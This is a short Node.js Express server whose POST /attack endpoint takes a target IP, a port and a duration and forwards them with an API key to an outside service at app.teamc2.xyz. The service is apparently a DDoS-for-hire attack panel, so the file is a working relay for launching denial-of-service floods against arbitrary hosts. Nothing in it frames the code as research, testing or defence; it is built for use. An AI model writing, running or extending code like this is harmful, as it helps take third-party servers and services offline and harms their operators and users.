require("dotenv").config();

const express = require("express");
const axios = require("axios");
const cors = require("cors");

const app = express();

app.use(cors());
app.use(express.json());

// 🔐 ENV se API key
const API_KEY = process.env.API_KEY;

// ✅ Railway compatible PORT
const PORT = process.env.PORT || 5000;

// ✅ Health check
app.get("/", (req, res) => {
  res.send("API Running 🚀");
});

// ✅ Main API
app.post("/attack", async (req, res) => {
  try {
    const { ip, port, time } = req.body;

    // ✅ FIX 1: validation
    if (!ip || !port || !time) {
      return res.status(400).json({ error: "Missing params" });
    }

    // ✅ FIX 2: template string
    const url = `https://app.teamc2.xyz/api/attack?api_key=${API_KEY}&target=${ip}&port=${port}&time=${time}&concurrent=1`;

    const response = await axios.get(url);

    res.json({
      success: true,
      data: response.data,
    });

  } catch (err) {
    console.error("ERROR:", err.message);
    res.status(500).json({ error: "Server error" });
  }
});

// ✅ FIX 3: console.log string
app.listen(PORT, "0.0.0.0", () => {
  console.log(`Server running on port ${PORT}`);
});